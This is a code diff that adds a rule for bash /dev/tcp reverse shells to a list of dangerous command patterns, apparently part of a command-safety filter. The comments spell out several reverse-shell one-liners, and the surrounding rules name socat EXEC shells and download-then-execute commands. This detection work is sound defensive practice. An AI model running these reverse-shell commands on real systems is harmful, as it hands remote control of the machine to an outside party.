@@ -295,6 +295,22 @@ DANGEROUS_PATTERNS = [
     # `(?:\S*/)?` accepts arbitrary path prefixes (e.g. `/usr/bin/bash`).
     (r'\bsocat\b.*\bEXEC\s*:\s*["\']?(?:\S*/)?(?:bash|sh|zsh|ksh|dash)\b',
      "reverse shell via socat EXEC"),
+    # Bash `/dev/tcp` (and `/dev/udp`) redirection-style reverse shell. The
+    # canonical `bash -i >& /dev/tcp/<host>/<port> 0>&1` form spawns a shell
+    # whose stdio is wired to a TCP socket without `-e` / `EXEC:` / `bash -c`,
+    # so the existing reverse-shell-via-flag and shell-bootstrap rules miss
+    # it. Anchor on the redirection target (`[<>]` followed by an optional
+    # `&` / fd-number then `/dev/tcp/` or `/dev/udp/`) rather than the shell
+    # name — that catches the explicit-FD variants too:
+    #   * `bash -i >& /dev/tcp/host/4444 0>&1`            (canonical)
+    #   * `bash -i 5<>/dev/tcp/host/4444 0<&5 1>&5 2>&5`  (numeric FD)
+    #   * `exec 196<>/dev/tcp/host/4444; sh <&196 >&196`  (raw exec)
+    # Common benign usage stays safe: bare `/dev/tcp/` mentions (`grep
+    # '/dev/tcp/' logs.txt`) lack a `[<>]` anchor immediately before the
+    # path, and unrelated `>` redirections (`echo hi > out.txt`) lack the
+    # `/dev/(tcp|udp)/` target.
+    (r'[<>]\s*&?\s*\d*\s*/dev/(?:tcp|udp)/',
+     "reverse shell via /dev/tcp redirection"),
     # Two-stage download-then-execute. `curl URL | bash` (pipe-to-shell) is
     # already caught above, but the trivial syntactic variant `curl -o file
     # && bash file` (or `; bash file`, `| chmod +x ... ; ./file`) is not.
